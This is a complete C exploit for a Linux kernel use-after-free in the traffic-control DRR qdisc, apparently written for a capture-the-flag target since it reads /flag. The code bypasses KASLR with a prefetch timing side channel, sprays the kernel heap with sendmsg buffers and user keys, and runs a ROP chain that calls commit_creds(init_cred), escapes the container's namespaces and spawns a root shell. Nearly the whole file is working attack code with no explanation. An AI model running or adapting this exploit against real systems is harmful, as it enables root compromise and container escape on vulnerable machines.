#define _GNU_SOURCE

#include <arpa/inet.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <keyutils.h>

#include <linux/tc_ematch/tc_em_meta.h>
#include <linux/rtnetlink.h>

#include <net/if.h>

int sockfd = -1;

uint64_t kbase = 0xffffffff81000000;

// KASLR bypass
//
// This code is adapted from https://github.com/IAIK/prefetch/blob/master/cacheutils.h
//
inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
    uint64_t a, d;
    asm volatile ("mfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        : "=r" (d), "=r" (a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
    uint64_t a, d;
    asm volatile(
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r" (d), "=r" (a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

void prefetch(void* p)
{
    asm volatile (
        "prefetchnta (%0)\n"
        "prefetcht2 (%0)\n"
        : : "r" (p));
}

size_t flushandreload(void* addr) // row miss
{
    size_t time = rdtsc_begin();
    prefetch(addr);
    size_t delta = rdtsc_end() - time;
    return delta;
}

#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

int bypass_kaslr(uint64_t base) {
    if (!base) {
    #ifdef KASLR_BYPASS_INTEL
        #define OFFSET 0
        #define START (0xffffffff81000000ull + OFFSET)
        #define END   (0xffffffffD0000000ull + OFFSET)
        #define STEP   0x0000000001000000ull
        while (1) {
            uint64_t bases[15] = {0};
            for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (uint64_t)ti;
                }

                for (int i = 0; i < 16; i++) {
                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    uint64_t addr = addrs[ti];
                    size_t t = flushandreload((void*)addr);
                    if (t < times[ti]) {
                        times[ti] = t;
                    }
                }
                }

                size_t minv = ~0;
                size_t mini = -1;
                for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++) {
                    if (times[ti] < minv) {
                        mini = ti;
                        minv = times[ti];
                    }
                }

                if (mini < 0) {
                    return -1;
                }

                bases[vote] = addrs[mini];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
            if (c == 0) {
                base = bases[i];
            } else if (base == bases[i]) {
                c++;
            } else {
                c--;
            }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
            if (base == bases[i]) {
                c++;
            }
            }
            if (c > ARRAY_LEN(bases) / 2) {
            base -= OFFSET;
            goto got_base;
            }
        }
    #else
        #define START (0xffffffff81000000ull)
        #define END (0xffffffffc0000000ull)
        #define STEP 0x0000000000200000ull
        #define NUM_TRIALS 9
        // largest contiguous mapped area at the beginning of _stext
        #define WINDOW_SIZE 11

        while (1) {
            uint64_t bases[NUM_TRIALS] = {0};

            for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (uint64_t)ti;
                }

                for (int i = 0; i < 16; i++) {
                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    uint64_t addr = addrs[ti];
                    size_t t = flushandreload((void*)addr);
                    if (t < times[ti]) {
                        times[ti] = t;
                    }
                }
                }

                uint64_t max = 0;
                int max_i = 0;
                for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++) {
                    uint64_t sum = 0;
                    for (int i = 0; i < WINDOW_SIZE; i++) {
                        sum += times[ti + i];
                    }
                    if (sum > max) {
                        max = sum;
                        max_i = ti;
                    }
                }

                bases[vote] = addrs[max_i];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
            if (c == 0) {
                base = bases[i];
            } else if (base == bases[i]) {
                c++;
            } else {
                c--;
            }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
            if (base == bases[i]) {
                c++;
            }
            }
            if (c > ARRAY_LEN(bases) / 2) {
            goto got_base;
            }
        }
    #endif
    }

got_base:
    kbase = base;
    printf("using kernel base %llx\n", base);

    return 0;
}

void win(){
    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);

    char buf[0x100] = {0,};

    int fd = open("/flag", O_RDONLY);
    read(fd, buf, 0x100);
    write(1, buf, 0x100);
    close(fd);

    char* shell[] = {
        "/bin/sh",
        "-c",
        "/bin/cat /flag ; /bin/sh",
        NULL,
    };

    execve(shell[0], shell, NULL);

    while(1);
}

uint64_t _user_rip = (uint64_t) win;
uint64_t _user_cs = 0;
uint64_t _user_rflags = 0;
uint64_t _user_sp = 0;
uint64_t _user_ss = 0;

void save_state(void) {
    __asm__(".intel_syntax noprefix;"
    "mov _user_cs, cs;"
    "mov _user_ss, ss;"
    "mov _user_sp, rsp;"
    "pushf;"
    "pop _user_rflags;"
    ".att_syntax");
    return;
}

#define FIND_TASK_BY_VPID                           0x1f11b0
#define SWITCH_TASK_NAMESPACES                      0x1fb7c0
#define COMMIT_CREDS                                0x1fdac0
#define INIT_CRED                                   0x2c74d80
#define INIT_NSPROXY                                0x2c748a0
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE  0x16011a6
#define OOPS_IN_PROGRESS                            0x3aea078
#define RCU_READ_LOCK_NESTING_OFF                   0x474
#define DRR_QDISC_OPS                               0x2f96b00

#define PUSH_RDI_POP_RSP_RET    0x4d1c07    // push rdi ; pop rsp ; jmp 0xffffffff82481da0
#define POP_POP_POP_RET         0xe18fd5    // pop r10 ; pop r12 ; pop rbp ; jmp 0xffffffff82481da0
#define POP_RDI_RET             0x015b16    // pop rdi ; jmp 0xffffffff82481da0
#define POP_RSI_RET             0x555b97    // pop rsi ; jmp 0xffffffff82481da0
#define ADD_RAX_RSI_RET         0x044190    // add rax, rsi ; jmp 0xffffffff82481da0
#define POP_RCX_RET             0x0326dc    // pop rcx ; jmp 0xffffffff82481da0
#define MOV_RAX_RCX_RET         0x81e7ab    // mov qword ptr [rax], rcx ; jmp 0xffffffff82481da0
#define MOV_RDI_RAX_RET         0x146baab   // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; jmp 0xffffffff82481da0
#define MOV_RSI_RDI_RET         0x3656f9    // mov qword ptr [rsi], rdi ; jmp 0xffffffff82481da0


void rop_chain(uint64_t* data){
    int i = 0;

    data[i++] = kbase + POP_POP_POP_RET;            // enqueue
    data[i++] = kbase + PUSH_RDI_POP_RSP_RET;       // dequeue

    data[i++] = 0;                                  // keylen
    data[i++] = kbase + DRR_QDISC_OPS;              // ops

    // current = find_task_by_vpid(getpid())
    data[i++] = kbase + POP_RDI_RET;
    data[i++] = getpid();
    data[i++] = kbase + FIND_TASK_BY_VPID;

    // current += offsetof(struct task_struct, rcu_read_lock_nesting)
    data[i++] = kbase + POP_RSI_RET;
    data[i++] = RCU_READ_LOCK_NESTING_OFF;
    data[i++] = kbase + ADD_RAX_RSI_RET;

    // current->rcu_read_lock_nesting = 0 (Bypass rcu protected section)
    data[i++] = kbase + POP_RCX_RET;
    data[i++] = 0;
    data[i++] = kbase + MOV_RAX_RCX_RET;

    // Bypass "schedule while atomic": set oops_in_progress = 1
    data[i++] = kbase + POP_RDI_RET;
    data[i++] = 1;
    data[i++] = kbase + POP_RSI_RET;
    data[i++] = 0;                                  // gsoskb.next

    data[i++] = kbase + POP_RSI_RET;
    data[i++] = kbase + OOPS_IN_PROGRESS;
    data[i++] = kbase + MOV_RSI_RDI_RET;

    // commit_creds(&init_cred)
    data[i++] = kbase + POP_RDI_RET;
    data[i++] = kbase + INIT_CRED;
    data[i++] = kbase + COMMIT_CREDS;

    // find_task_by_vpid(1)
    data[i++] = kbase + POP_RDI_RET;
    data[i++] = 1;
    data[i++] = kbase + FIND_TASK_BY_VPID;

    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    data[i++] = kbase + MOV_RDI_RAX_RET;
    data[i++] = kbase + POP_RSI_RET;
    data[i++] = kbase + INIT_NSPROXY;
    data[i++] = kbase + SWITCH_TASK_NAMESPACES;

    data[i++] = kbase + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;
    data[i++] = 0;
    data[i++] = 0;
    data[i++] = _user_rip;
    data[i++] = _user_cs;
    data[i++] = _user_rflags;
    data[i++] = _user_sp;
    data[i++] = _user_ss;
}

void write_file(const char *filename, char *text) {
    int fd = open(filename, O_RDWR | O_CREAT, 0600);

    write(fd, text, strlen(text));
    close(fd);
}

void new_ns(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    char buffer[0x100];

    unshare(CLONE_NEWUSER | CLONE_NEWNS);

    unshare(CLONE_NEWNET);

    write_file("/proc/self/setgroups", "deny");

    snprintf(buffer, sizeof(buffer), "0 %d 1", uid);
    write_file("/proc/self/uid_map", buffer);
    snprintf(buffer, sizeof(buffer), "0 %d 1", gid);
    write_file("/proc/self/gid_map", buffer);
}

void set_affinity(int cpuid){
    cpu_set_t my_set;
    int cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);

    if (cpu_cores == 1) return;

    CPU_ZERO(&my_set);

    CPU_SET(cpuid, &my_set);

    if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
        perror("[-] sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
}

#define NETLINK_BUFSIZE 4096

int ip_link_lo_up() {
    struct {
        struct nlmsghdr nlh;
        struct ifinfomsg ifinfo;
        char buffer[NETLINK_BUFSIZE];
    } req;

    struct sockaddr_nl sa;
    struct iovec iov;
    struct msghdr msg;
    int sock;
    int lo_ifindex;

    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    lo_ifindex = if_nametoindex("lo");
    if (lo_ifindex == 0) {
        perror("if_nametoindex");
        close(sock);
        return -1;
    }

    memset(&req, 0, sizeof(req));
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    req.nlh.nlmsg_type = RTM_NEWLINK;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    req.ifinfo.ifi_family = AF_UNSPEC;
    req.ifinfo.ifi_index = lo_ifindex;
    req.ifinfo.ifi_change = 0xFFFFFFFF;
    req.ifinfo.ifi_flags = IFF_UP | IFF_RUNNING;

    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;

    iov.iov_base = &req;
    iov.iov_len = req.nlh.nlmsg_len;
    memset(&msg, 0, sizeof(msg));
    msg.msg_name = &sa;
    msg.msg_namelen = sizeof(sa);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    if (sendmsg(sock, &msg, 0) < 0) {
        perror("sendmsg");
        close(sock);
        return -1;
    }

    close(sock);
    return 0;
}

#define err_exit(s) do { perror(s); exit(EXIT_FAILURE); } while(0)

void loopback_send (uint64_t p) {
    struct sockaddr iaddr = { AF_INET };
    int priority = p;
    char data[0x1000] = {0,};

    int inet_sock_fd = socket(PF_INET, SOCK_DGRAM, 0);

    if (inet_sock_fd == -1)
        err_exit("[-] inet socket");

    setsockopt(inet_sock_fd, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));

    if (connect(inet_sock_fd, &iaddr, sizeof(iaddr)) == -1)
        err_exit("[-] connect");

    if (write(inet_sock_fd, data, 1) == -1)
        err_exit("[-] inet write");

    close(inet_sock_fd);
}

#define NLMSG_TAIL(nmsg)                                                       \
((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))

int addattr_l(struct nlmsghdr *n, int maxlen, int type, const void *data,
            int alen) {
    int len = RTA_LENGTH(alen);
    struct rtattr *rta;

    if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
        fprintf(stderr, "addattr_l ERROR: message exceeded bound of %d\n", maxlen);
        return -1;
    }
    rta = NLMSG_TAIL(n);
    rta->rta_type = type;
    rta->rta_len = len;
    if (alen)
    memcpy(RTA_DATA(rta), data, alen);
    n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
    return 0;
}

struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type) {
    struct rtattr *nest = NLMSG_TAIL(n);

    addattr_l(n, maxlen, type, NULL, 0);
    return nest;
}

int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest) {
    nest->rta_len = (void *)NLMSG_TAIL(n) - (void *)nest;
    return n->nlmsg_len;
}

int add_qdisc_drr(int fd, uint32_t parent, uint32_t handle) {
    char *start = malloc(0x1000);
    memset(start, 0, 0x1000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
    msg->nlmsg_type = RTM_NEWQDISC;

    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = parent;
    t->tcm_handle = handle;

    uint32_t prio = 1;
    uint32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);

    addattr_l(msg, 0x1000, TCA_KIND, "drr", 4);

    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(fd, &msgh, 0);

    free(start);

    return 1;
}

int add_qdisc_netem(int fd, uint32_t parent, uint32_t handle, int64_t latency) {
    char *start = malloc(0x1000);
    memset(start, 0, 0x1000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
    msg->nlmsg_type = RTM_NEWQDISC;

    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = parent;
    t->tcm_handle = handle;

    uint32_t prio = 1;
    uint32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);

    addattr_l(msg, 0x1000, TCA_KIND, "netem", 6);

    struct tc_netem_qopt opt = {0,};

    opt.latency = latency;
    opt.limit   = 1000;

    addattr_l(msg, 0x1000, TCA_OPTIONS, &opt, sizeof(struct tc_netem_qopt));

    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(fd, &msgh, 0);

    free(start);

    return 1;
}

int add_class_drr(int fd, uint32_t parent, uint32_t handle) {
    char *start = malloc(0x2000);
    memset(start, 0, 0x2000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    msg = msg + msg->nlmsg_len;
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    msg->nlmsg_type = RTM_NEWTCLASS;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = parent;
    t->tcm_handle = handle;

    uint32_t prio = 1;
    uint32_t protocol = 1;

    t->tcm_info = TC_H_MAKE(prio << 16, protocol);

    addattr_l(msg, 0x1000, TCA_KIND, "drr", 4);
    struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);

    addattr_nest_end(msg, tail);

    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(fd, &msgh, 0);

    free(start);

    return 1;
}

int del_class_drr(int fd, uint32_t handle) {
    char *start = malloc(0x2000);
    memset(start, 0, 0x2000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    msg = msg + msg->nlmsg_len;
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST;
    msg->nlmsg_type = RTM_DELTCLASS;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = TC_H_ROOT;
    t->tcm_handle = handle;

    uint32_t prio = 1;
    uint32_t protocol = 1;

    t->tcm_info = TC_H_MAKE(prio << 16, protocol);

    struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);

    addattr_nest_end(msg, tail);

    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(fd, &msgh, 0);

    free(start);

    return 1;
}

void spray_sendmsg(char *buff, size_t size) {
    struct msghdr msg = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6666);

    msg.msg_control = buff;
    msg.msg_controllen = size;
    msg.msg_name = (caddr_t)&addr;
    msg.msg_namelen = sizeof(addr);

    sendmsg(sockfd, &msg, 0);
}

#define USER_KEY_PAYLOAD_HEADER_LEN 0x18
int keys[0x1000];

/*
*	Allocate a user_key_payload structure.
*/
int key_alloc(int i, char *buff, size_t size)
{
    char desc[256] = { 0 };
    key_serial_t key;
    char *payload;

    sprintf(desc, "payload_%d", i);

    size -= USER_KEY_PAYLOAD_HEADER_LEN;
    payload = buff ? buff : calloc(1, size);

    if (!buff)
        *(uint64_t *)&payload[0] = i; // Tag the key

    keys[i] = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

    if (keys[i] < 0) {
        perror("[x] key_alloc()");
        return -1;
    }

    return 0;
}

#define NETEM_10MS 156250
#define SPRAY_SIZE 512
#define SPRAY_KEY_SIZE 264

void exploit(){
    sockfd = socket(PF_NETLINK, SOCK_RAW, 0);

    const unsigned int drr_qdisc = 0xffff0000;
    const unsigned int drr_class = 0xffff0001;
    const unsigned int drr_class_vuln = 0xffffffff;

    const unsigned int netem_qdisc = 0x20000;

    add_qdisc_drr(sockfd, TC_H_ROOT, drr_qdisc);

    add_class_drr(sockfd, drr_qdisc, drr_class_vuln);
    add_class_drr(sockfd, drr_qdisc, drr_class);

    add_qdisc_netem(sockfd, drr_class, netem_qdisc, NETEM_10MS);

    loopback_send(drr_class);
    loopback_send(drr_class_vuln);

    del_class_drr(sockfd, drr_class_vuln);

    // wait for destroy
    usleep(50*1000);

    char rop_data[SPRAY_SIZE+1] = {0,};
    rop_chain((uint64_t*) rop_data);

    for(int i = 0 ; i < 3; i++){
        spray_sendmsg(rop_data, SPRAY_SIZE);
        key_alloc(i, rop_data+USER_KEY_PAYLOAD_HEADER_LEN, SPRAY_KEY_SIZE);
    }

    loopback_send(drr_class);
}

int main(int argc, char **argv) {
    save_state();

    new_ns();

    bypass_kaslr(0);

    set_affinity(0);

    ip_link_lo_up();

    exploit();
}
